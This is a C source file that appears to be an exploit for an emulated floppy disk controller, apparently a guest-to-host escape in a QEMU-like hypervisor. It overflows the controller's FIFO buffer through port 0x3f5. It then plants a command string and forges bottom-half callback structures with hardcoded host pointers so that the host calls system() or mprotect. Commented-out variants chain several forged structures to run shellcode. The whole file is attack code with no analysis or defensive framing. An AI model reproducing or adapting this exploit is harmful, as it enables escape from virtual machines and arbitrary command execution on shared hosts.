#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define BH_COUNT 0x6ff
#define SH_POSITION 0x1ff
#define SH_COUNT 7
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05
#define NUM_STRUCT 0x00
#define STRUCT_LEN 0x28
int main(void){
        unsigned char code[] = {'m','k','t','e','m','p','\0'};
        int len_of_command = sizeof(code)/(sizeof(char));
        printf("len = %d\n", len_of_command);
        // //bh1 change dl
        // char ctx1[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        // char cb1[8] =    {0x3f,0x7a,0x6d,0x55,0x55,0x55,0x00,0x00};
        // char opaque1[8]= {0x00,0x20,0x20,0x56,0x55,0x55,0x00,0x00};
        // char next1[8]=   {0xb0,0x2a,0x20,0x56,0x55,0x55,0x00,0x00};
        // char sid1[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        // //new bh1   call mprotect 
        // char ctx2[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        // char cb2[8] =    {0x20,0xea,0x3d,0xf6,0xff,0x7f,0x00,0x00};
        // char opaque2[8]= {0x00,0x20,0x20,0x56,0x55,0x55,0x00,0x00};
        // char next2[8]=   {0xd8,0x2a,0x20,0x56,0x55,0x55,0x00,0x00};
        // char sid2[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        // //bh2 do shell code
        // char ctx3[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        // char cb3[8] =    {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
        // char opaque3[8]= {0x40,0xa5,0x1c,0x56,0x55,0x55,0x00,0x00};
        // char next3[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
        // char sid3[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

         //original bh  try to system and don't change the flow after that, make next the original next
        char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        char cb[8] =    {0x30,0xf2,0x6b,0xf6,0xff,0x7f,0x00,0x00};
        char opaque[8]= {0x00,0x26,0x20,0x56,0x55,0x55,0x00,0x00};
        char next[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
        char sid[8]= {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

        iopl(3);
        ioperm(FIFO, 1, 1);
	// printf("write spc_command to port\n");
        outb(SPC_COMMAND, FIFO);
        int i,j;
        j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
        //find a position to write shell code
        for(i=0; i<SH_POSITION; i++ ){
            outb(TEST_VAL,0x3f5);
        }
        //write shell code
        for(i=0;i<SH_COUNT; i++){
            outb(code[i], FIFO);
        }
        // go to bh struct
        for(i=0; i<j; i++){
            outb(TEST_VAL, FIFO);
        }
        //start to create bh struct
        // for(i=0; i< 8; i++){
        //     outb(ctx1[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(cb1[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(opaque1[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(next1[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(sid1[i], FIFO);
        // }
        // //second one
        // for(i=0; i< 8; i++){
        //     outb(ctx2[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(cb2[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(opaque2[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(next2[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(sid2[i], FIFO);
        // }
        // //third one
        // for(i=0; i< 8; i++){
        //     outb(ctx3[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(cb3[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(opaque3[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(next3[i], FIFO);
        // }
        // for(i=0; i< 8; i++){
        //     outb(sid3[i], FIFO);
        // }
        //real one
         for(i=0; i< 8; i++){
            outb(ctx[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(cb[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(opaque[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(next[i], FIFO);
        }
        for(i=0; i< 3; i++){
            outb(sid[i], FIFO);
        }
}
